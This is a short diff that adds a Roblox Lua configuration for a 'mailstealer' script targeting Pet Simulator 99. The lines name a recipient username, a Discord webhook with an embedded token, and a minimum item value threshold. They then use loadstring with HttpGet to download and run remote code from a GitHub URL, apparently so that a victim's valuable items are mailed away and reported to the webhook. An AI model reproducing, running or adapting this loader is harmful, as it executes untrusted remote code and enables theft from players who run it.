@@ -1,0 +1,4 @@
+Username = "AOWHDPD"
+Webhook = "https://discord.com/api/webhooks/1274292425724264458/qX-JZbTx__obXb18wwDa6xiNGwuBrxmKToD6sOCMxlnUbCDhsQAujHSGpU-hwDkhgWFx"
+min_rap =  1500000  --minimum rap for potion an enchants
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/PS99/mailstealer"))()
